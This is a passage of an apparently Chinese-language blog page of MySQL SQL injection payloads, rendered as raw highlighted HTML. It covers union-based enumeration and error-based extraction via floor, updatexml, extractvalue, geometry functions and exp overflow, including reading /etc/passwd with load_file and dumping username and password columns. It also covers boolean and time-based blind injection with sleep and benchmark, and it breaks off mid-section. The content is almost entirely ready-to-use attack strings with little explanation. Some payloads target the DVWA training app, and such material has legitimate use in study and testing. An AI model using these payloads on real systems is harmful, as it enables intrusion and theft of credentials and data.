class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">//爆字段数<br><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span> #<br>//爆回显<br><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> #<br>//爆信息<br><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> version(),<span class="hljs-keyword">user</span>(),<span class="hljs-keyword">database</span>() #<br>//爆库名<br><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">schema_name</span>) <span class="hljs-keyword">from</span> information_schema.schemata<br><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">schema_name</span> <span class="hljs-keyword">from</span> information_schema.schemata <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) #<br>//爆表名<br><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=&lt;数据库名&gt; #<br><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema = &lt;数据库名&gt;) #<br>//爆列名<br><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;&lt;数据库名&gt;&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;&lt;表名&gt;&#x27;</span> #<br><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span> = <span class="hljs-string">&#x27;&lt;表名&gt;&#x27;</span>) #<br>//爆字段<br><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(&lt;列名&gt;,<span class="hljs-string">&#x27;--&#x27;</span>,&lt;列名&gt;,<span class="hljs-string">&#x27;--&#x27;</span>,&lt;列名&gt;) <span class="hljs-keyword">from</span> &lt;表名/库名.表名&gt; #<br><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(&lt;列名<span class="hljs-number">1</span>&gt;) <span class="hljs-keyword">from</span> &lt;表名&gt;),(<span class="hljs-keyword">select</span> group_concat(&lt;列名<span class="hljs-number">2</span>&gt;) <span class="hljs-keyword">from</span> &lt;表名&gt;),(<span class="hljs-keyword">select</span> group_concat(&lt;列名<span class="hljs-number">3</span>&gt;) <span class="hljs-keyword">from</span> &lt;表名&gt;)<br></code></pre></td></tr></table></figure><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>floor函数</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs q"><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),concat(database(),<span class="hljs-built_in">floor</span>(<span class="hljs-built_in">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">group</span> <span class="hljs-keyword">by</span> x)a) --+<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">group</span> <span class="hljs-keyword">by</span> concat(version(),<span class="hljs-built_in">floor</span>(<span class="hljs-built_in">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))<br><span class="hljs-built_in">and</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> (SELECT <span class="hljs-built_in">distinct</span> concat(<span class="hljs-number">0x7e</span>,schema_name,<span class="hljs-number">0x7e</span>) FROM information_schema.schemata LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(<span class="hljs-built_in">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">group</span> <span class="hljs-keyword">by</span> x)a)  <span class="hljs-comment">//爆数据库</span><br><span class="hljs-built_in">and</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> (SELECT <span class="hljs-built_in">distinct</span> concat(<span class="hljs-number">0x7e</span>,table_name,<span class="hljs-number">0x7e</span>) FROM information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=database() LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(<span class="hljs-built_in">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">group</span> <span class="hljs-keyword">by</span> x)a) <span class="hljs-comment">//爆表</span><br><span class="hljs-built_in">and</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> (SELECT <span class="hljs-built_in">distinct</span> concat(<span class="hljs-number">0x7e</span>,column_name,<span class="hljs-number">0x7e</span>) FROM information_schema.columns <span class="hljs-built_in">where</span> table_name=表名 LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(<span class="hljs-built_in">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">group</span> <span class="hljs-keyword">by</span> x)a)  <span class="hljs-comment">//爆字段</span><br><span class="hljs-built_in">and</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> (SELECT <span class="hljs-built_in">distinct</span> concat(<span class="hljs-number">0x23</span>,user_id,<span class="hljs-number">0x3a</span>,password,<span class="hljs-number">0x23</span>) FROM user limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(<span class="hljs-built_in">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">group</span> <span class="hljs-keyword">by</span> x)a)  <span class="hljs-comment">//爆内容</span><br></code></pre></td></tr></table></figure><p>UPDATEXML函数</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">1&#x27; and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)--+<br>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;dvwa&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>)<br><span class="hljs-string">&#x27; and (extractvalue(1,concat(0x7e,(select user()),0x7e))) --+</span><br></code></pre></td></tr></table></figure><p>几何函数报错</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">geometrycollection</span>(<span class="hljs-params">(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> user(</span>))a)b))</span>;<br><span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">multipoint</span>(<span class="hljs-params">(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> user(</span>))a)b))</span>;<br><span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">polygon</span>(<span class="hljs-params">(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> user(</span>))a)b))</span>;<br><span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">multipolygon</span>(<span class="hljs-params">(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> user(</span>))a)b))</span>;<br><span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">linestring</span>(<span class="hljs-params">(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> user(</span>))a)b))</span>;<br><span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">multilinestring</span>(<span class="hljs-params">(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> user(</span>))a)b))</span>;<br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">1&#x27; and exp(~(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a));<br><span class="hljs-keyword">select</span> ~<span class="hljs-number">0</span> //将<span class="hljs-number">0</span>取反，函数成功执行后返回<span class="hljs-number">0</span>的缘故，我们将成功执行的函数取反就会得到最大的无符号BIGINT值。<br>MySql5<span class="hljs-number">.5</span><span class="hljs-number">.5</span>版本后整形溢出才会报错<br>得到表名：<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">exp</span>(~(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)x));<br>得到列名：<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">exp</span>(~(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)x));<br>检索数据：<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">exp</span>(~ (<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> concat_ws(<span class="hljs-string">&#x27;:&#x27;</span>,id, username, <span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)x));<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users (id, username, <span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span> (<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> !(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())x)-~<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;Eyre&#x27;</span>);<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">exp</span>(~(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> load_file(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>))a));读取本地文件<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users (id, username, <span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span> (<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> !(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span>(concat(@:=<span class="hljs-number">0</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*)<span class="hljs-keyword">from</span><span class="hljs-symbol">`information_schema`</span>.columns <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-keyword">and</span>@:=concat(@,<span class="hljs-number">0xa</span>,table_schema,<span class="hljs-number">0x3a3a</span>,table_name,<span class="hljs-number">0x3a3a</span>,column_name)),@)))x)-~<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;Eyre&#x27;</span>);<br><br><span class="hljs-keyword">update</span> users <span class="hljs-keyword">set</span> <span class="hljs-keyword">password</span>=<span class="hljs-string">&#x27;Peter&#x27;</span> <span class="hljs-keyword">or</span> !(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())x)-~<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">where</span> id=<span class="hljs-number">4</span>;<br><br><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">or</span> !(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())x)-~<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;&#x27;</span>;<br></code></pre></td></tr></table></figure><p>Extractvalue</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> extractvalue(rand(),concat(<span class="hljs-type">CHAR</span>(<span class="hljs-number">126</span>),version(),<span class="hljs-type">CHAR</span>(<span class="hljs-number">126</span>)))<span class="hljs-comment">--</span><br>?id=<span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> extractvalue(rand(),concat(<span class="hljs-number">0x3a</span>,(<span class="hljs-keyword">SELECT</span> concat(<span class="hljs-type">CHAR</span>(<span class="hljs-number">126</span>),<span class="hljs-built_in">schema_name</span>,<span class="hljs-type">CHAR</span>(<span class="hljs-number">126</span>)) <span class="hljs-keyword">FROM</span> information_schema.schemata <span class="hljs-keyword">LIMIT</span> data_offset,<span class="hljs-number">1</span>)))<span class="hljs-comment">--</span><br>?id=<span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> extractvalue(rand(),concat(<span class="hljs-number">0x3a</span>,(<span class="hljs-keyword">SELECT</span> concat(<span class="hljs-type">CHAR</span>(<span class="hljs-number">126</span>),<span class="hljs-built_in">TABLE_NAME</span>,<span class="hljs-type">CHAR</span>(<span class="hljs-number">126</span>)) <span class="hljs-keyword">FROM</span> information_schema.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">WHERE</span> table_schema=data_column <span class="hljs-keyword">LIMIT</span> data_offset,<span class="hljs-number">1</span>)))<span class="hljs-comment">--</span><br>?id=<span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> extractvalue(rand(),concat(<span class="hljs-number">0x3a</span>,(<span class="hljs-keyword">SELECT</span> concat(<span class="hljs-type">CHAR</span>(<span class="hljs-number">126</span>),<span class="hljs-built_in">column_name</span>,<span class="hljs-type">CHAR</span>(<span class="hljs-number">126</span>)) <span class="hljs-keyword">FROM</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-built_in">TABLE_NAME</span>=data_table <span class="hljs-keyword">LIMIT</span> data_offset,<span class="hljs-number">1</span>)))<span class="hljs-comment">--</span><br>?id=<span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> extractvalue(rand(),concat(<span class="hljs-number">0x3a</span>,(<span class="hljs-keyword">SELECT</span> concat(<span class="hljs-type">CHAR</span>(<span class="hljs-number">126</span>),data_info,<span class="hljs-type">CHAR</span>(<span class="hljs-number">126</span>)) <span class="hljs-keyword">FROM</span> data_table.data_column <span class="hljs-keyword">LIMIT</span> data_offset,<span class="hljs-number">1</span>)))<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p>NAME_CONST</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> (<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> NAME_CONST(version(),<span class="hljs-number">1</span>),NAME_CONST(version(),<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> x)<span class="hljs-comment">--</span><br>?id=<span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> (<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> NAME_CONST(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span>),NAME_CONST(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> x)<span class="hljs-comment">--</span><br>?id=<span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> (<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> NAME_CONST(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>),NAME_CONST(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> x)<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><h4 id="盲注："><a href="#盲注：" class="headerlink" title="盲注："></a>盲注：</h4><h5 id="布尔"><a href="#布尔" class="headerlink" title="布尔"></a>布尔</h5><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">1</span><span class="hljs-comment">&#x27; and left(database(),4)=&#x27;dvwa&#x27; --+</span><br><span class="hljs-number">1</span><span class="hljs-comment">&#x27; and mid(database(),1,1)=&#x27;d&#x27; --+</span><br><span class="hljs-number">1</span><span class="hljs-comment">&#x27; and ascii(mid(database(),1,1))=&#x27;100&#x27;--+</span><br><span class="hljs-number">1</span><span class="hljs-comment">&#x27; and length(database())&gt;=5--+判断库名长度</span><br><span class="hljs-number">1</span><span class="hljs-comment">&#x27; and substr(database(),1,1)=&#x27;d&#x27;--+ 截取库名第一个字符</span><br><span class="hljs-symbol">1 </span><span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=(<span class="hljs-keyword">if</span>((user() regexp <span class="hljs-comment">&#x27;^r&#x27;),1,0)) --+</span><br><span class="hljs-symbol">1 </span><span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=(user() like <span class="hljs-comment">&#x27;r%25&#x27;) --+</span><br></code></pre></td></tr></table></figure><h5 id="时间："><a href="#时间：" class="headerlink" title="时间："></a>时间：</h5><p>SLEEP函数</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(length(database())&gt;=4,sleep(5),1)--+</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(ascii(mid(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-string">&#x27;100&#x27;</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> sleep(<span class="hljs-number">10</span>) <span class="hljs-keyword">from</span> dual <span class="hljs-keyword">where</span> <span class="hljs-keyword">database</span>() <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%&#x27;</span>)#<br><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> sleep(<span class="hljs-number">10</span>) <span class="hljs-keyword">from</span> dual <span class="hljs-keyword">where</span> <span class="hljs-keyword">database</span>() <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;___&#x27;</span>)#<br><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> sleep(<span class="hljs-number">10</span>) <span class="hljs-keyword">from</span> dual <span class="hljs-keyword">where</span> <span class="hljs-keyword">database</span>() <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;_____&#x27;</span>)#<br><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> sleep(<span class="hljs-number">10</span>) <span class="hljs-keyword">from</span> dual <span class="hljs-keyword">where</span> <span class="hljs-keyword">database</span>() <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;a____&#x27;</span>)#<br><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> sleep(<span class="hljs-number">10</span>) <span class="hljs-keyword">from</span> dual <span class="hljs-keyword">where</span> <span class="hljs-keyword">database</span>() <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;s____&#x27;</span>)#<br><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> sleep(<span class="hljs-number">10</span>) <span class="hljs-keyword">from</span> dual <span class="hljs-keyword">where</span> <span class="hljs-keyword">database</span>() <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;sa___&#x27;</span>)#<br><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> sleep(<span class="hljs-number">10</span>) <span class="hljs-keyword">from</span> dual <span class="hljs-keyword">where</span> <span class="hljs-keyword">database</span>() <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;swa__&#x27;</span>)#<br><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> sleep(<span class="hljs-number">10</span>) <span class="hljs-keyword">from</span> dual <span class="hljs-keyword">where</span> <span class="hljs-keyword">database</span>() <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;swb__&#x27;</span>)#<br><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> sleep(<span class="hljs-number">10</span>) <span class="hljs-keyword">from</span> dual <span class="hljs-keyword">where</span> <span class="hljs-keyword">database</span>() <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;swi__&#x27;</span>)#<br><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> sleep(<span class="hljs-number">10</span>) <span class="hljs-keyword">from</span> dual <span class="hljs-keyword">where</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">and</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%pass%&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%&#x27;</span>)#<br><br>BENCHMARK<br>```<span class="hljs-keyword">sql</span><br><span class="hljs-keyword">Select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> user_id= <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">if</span>(ascii(substr(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">100</span>,benchmark(<span class="hljs-number">100000000</span>,sha(<span class="hljs-number">1</span>)), <span class="hljs-keyword">null</span>));<br></code></pre></td></tr></table></figure><p>笛卡尔积</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">将两个大表做乘积。现在，我们有两个集合A和<span class="hljs-keyword">B。</span><br><span class="hljs-keyword"></span>A = &#123;<span class="hljs-number">0</span>,<span class="hljs-number">1</span>&#125;     <span class="hljs-keyword">B </span>= &#123;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>&#125;<br>集合 A×<span class="hljs-keyword">B </span>和 <span class="hljs-keyword">B×A的结果集就可以分别表示为以下这种形式：</span><br><span class="hljs-keyword"></span>A×<span class="hljs-keyword">B </span>= &#123;（<span class="hljs-number">0</span>，<span class="hljs-number">2</span>），（<span class="hljs-number">1</span>，<span class="hljs-number">2</span>），（<span class="hljs-number">0</span>，<span class="hljs-number">3</span>），（<span class="hljs-number">1</span>，<span class="hljs-number">3</span>），（<span class="hljs-number">0</span>，<span class="hljs-number">4</span>），（<span class="hljs-number">1</span>，<span class="hljs-number">4</span>）&#125;；<br><span class="hljs-keyword">B×A </span>= &#123;（<span 